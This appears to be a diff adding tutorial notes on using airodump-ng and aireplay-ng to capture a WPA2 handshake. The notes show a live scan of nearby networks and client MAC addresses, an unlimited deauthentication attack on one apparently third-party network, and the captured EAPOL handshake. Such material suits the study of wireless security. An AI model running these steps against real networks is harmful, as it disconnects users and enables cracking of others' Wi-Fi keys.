@@ -21,7 +21,6 @@ easside-ng 	    A tool for communicating to an access point, without the WEP key
 tkiptun-ng 	    WPA/TKIP attack tool.
 wesside-ng 	    Automatic tool for WEP key recovery.
 
-## Using Aircrack-ng to Capture 4-way Handshake
 - The 4-way handshake is the process of exchanging 4 messages between an access point (authenticator) and the client device (supplicant) 
   to generate some encryption keys which can be used to encrypt actual data sent over Wireless medium. 
 ## Keys
@@ -34,3 +33,88 @@ ANonce
 SNonce
 MI
 
+-----------------------------------------------
+## Using Aircrack-ng to Capture 4-way Handshake
+
+- command airodump-ng [wireless interface]
+
+    
+  CH  5][ Elapsed: 48 s ][ 2022-12-04 19:37             // process channel hopping (finding acces point no matter what channel they are on
+
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID      // BSSID are acces points. Those acces point are broadcasting beacons to announce their presence
+
+ 38:54:9B:21:47:20  -57       65        3    0  11  130   WPA2 CCMP   PSK  O2-Internet-043                                                                                                                                                  
+ E4:E7:49:D1:07:B0  -59       32        0    0  11   65   WPA2 CCMP   PSK  DIRECT-AF-HP DeskJet 2600 series                                                                                                                                 
+ E4:18:6B:78:F9:51  -66       96        0    0   4  130   WPA2 CCMP   PSK  Internet_F951                                                                                                                                                    
+ EC:41:18:3E:E5:FE  -68       60        1    0  11  130   WPA2 CCMP   PSK  O2-Internet-043_plus                                                                                                                                             
+ 7C:39:53:80:6E:58  -73       49        0    0   7  130   WPA2 CCMP   PSK  O2-Internet-678                                                                                                                                                  
+ 4C:BC:E9:8D:BD:22  -77       57        0    0  11   65   WPA2 CCMP   PSK  AT_401_RAC_056905_WW_bd22                                                                                                                                        
+ 5C:F4:AB:06:DC:8B  -82       57        1    0   1  130   WPA2 CCMP   PSK  Internet_88                                                                                                                                                      
+ 90:9A:4A:48:BA:C1  -87       25        7    0  11  270   WPA2 CCMP   PSK  czakovi2021                                                                                                                                                      
+ 84:01:12:7D:47:B6  -88       33        5    0  11  130   WPA2 CCMP   PSK  test                                                                                                                                                             
+ 92:9A:4A:68:BA:C1  -88       25        0    0  11  270   WPA2 CCMP   PSK  <length:  0>                                                                                                                                                     
+ 80:8C:97:C2:C2:E4  -88       18        9    0   1  195   WPA2 CCMP   PSK  Vegis71                                                                                                                                                          
+ AC:84:C6:DA:4D:67  -89       35        0    0   1  270   WPA2 CCMP   PSK  czakovi2018                                                                                                                                                      
+ 80:02:9C:4D:20:90   -1        0        0    0  -1   -1                    <length:  0>                                                                                                                                                     
+ FC:EE:12:00:2D:FF  -87        2        0    0  11  135   WPA2 CCMP   PSK  CXSWBox-FCEE12002DFF                                                                                                                                             
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes      // stations are client
+
+ 38:54:9B:21:47:20  EE:41:18:0E:E5:FE  -66   24e- 1e     0        7                                                                                                                                                                          
+ 38:54:9B:21:47:20  40:31:3C:AA:58:28  -81    0 - 1     33        8         O2-Internet-043                                                                                                                                                  
+ 80:02:9C:4D:20:90  52:D4:F7:5A:6D:B9  -89    0 - 1      0        2         Nordic2.4Ghz_4D208F
+ 
+- Now that we know the channel that access point is operating on we use -c[channel number] 
+- To write packet capture to file we use -w [file] 
+- To only display data relevant to us targeting acces point we use -d [access point mac adress] 
+
+## Example 
+user@system:~$ sudo airodump-ng -c4 -w CaptureFile -d E4:18:6B:78:F9:51 [wireless interface] // targeting Internet_F951 
+ CH  4 ][ Elapsed: 18 s ][ 2022-12-04 19:54 
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ E4:18:6B:78:F9:51  -69 100      206        1    0   4  130   WPA2 CCMP   PSK  Internet_F951                        
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ E4:18:6B:78:F9:51  B6:A8:A9:29:93:ED  -27    0 -24e     0        1    
+ 
+- To capture the handshake, we need to knock off the station that is linked to us targeting access point. So that when it start to reauthenticate
+   we can capture the 4-way handshake
+- Using aireplay-ng 
+- command aireplay-ng --deauth 0 -a [access point mac adress] -c [clients mac adress] 
+- We are sending deauthenticating packets at unlimited rate (0) 
+- -a for acces point and -c for client because if we dont specify any clients it is going to broadcast deauth packets towards all clients on the network
+
+## Example
+user@system:~$ sudo airodump-ng -c4 -w CaptureFile -d E4:18:6B:78:F9:51 [wireless interface] // targeting Internet_F951 
+- in other terminal 
+user@system:~$ sudo aireplay-ng --deauth 0 -a E4:18:6B:78:F9:51 -c B6:A8:A9:29:93:ED [wireless interface]
+
+user@system:~$ sudo aireplay-ng --deauth 0 -a E4:18:6B:78:F9:51 -c B6:A8:A9:29:93:ED wlp0s20f3mon
+[sudo] password for user: 
+20:09:34  Waiting for beacon frame (BSSID: E4:18:6B:78:F9:51) on channel 4
+20:09:35  Sending 64 directed DeAuth (code 7). STMAC: [B6:A8:A9:29:93:ED] [ 0|64 ACKs]
+20:09:35  Sending 64 directed DeAuth (code 7). STMAC: [B6:A8:A9:29:93:ED] [27|65 ACKs]
+20:09:36  Sending 64 directed DeAuth (code 7). STMAC: [B6:A8:A9:29:93:ED] [34|65 ACKs]
+20:09:36  Sending 64 directed DeAuth (code 7). STMAC: [B6:A8:A9:29:93:ED] [17|65 ACKs]
+20:09:37  Sending 64 directed DeAuth (code 7). STMAC: [B6:A8:A9:29:93:ED] [ 0|64 ACKs]
+20:09:37  Sending 64 directed DeAuth (code 7). STMAC: [B6:A8:A9:29:93:ED] [ 0|64 ACKs]
+20:09:38  Sending 64 directed DeAuth (code 7). STMAC: [B6:A8:A9:29:93:ED] [ 0|64 ACKs]
+20:09:38  Sending 64 directed DeAuth (code 7). STMAC: [B6:A8:A9:29:93:ED] [ 0|64 ACKs]
+20:09:39  Sending 64 directed DeAuth (code 7). STMAC: [B6:A8:A9:29:93:ED] [ 0|64 ACKs]
+20:09:39  Sending 64 directed DeAuth (code 7). STMAC: [B6:A8:A9:29:93:ED] [18|64 ACKs]
+...
+- it may take a while
+- in first terminal  
+ CH  4 ][ Elapsed: 2 mins ][ 2022-12-04 20:12 ][ WPA handshake: E4:18:6B:78:F9:51  // you can see WPA handshake
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ E4:18:6B:78:F9:51  -70   0     1505       82    0   4  130   WPA2 CCMP   PSK  Internet_F951                        
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ E4:18:6B:78:F9:51  B6:A8:A9:29:93:ED  -69    1e- 1e     0    33134  EAPOL  
+- we can check the .Cap file in wireshark
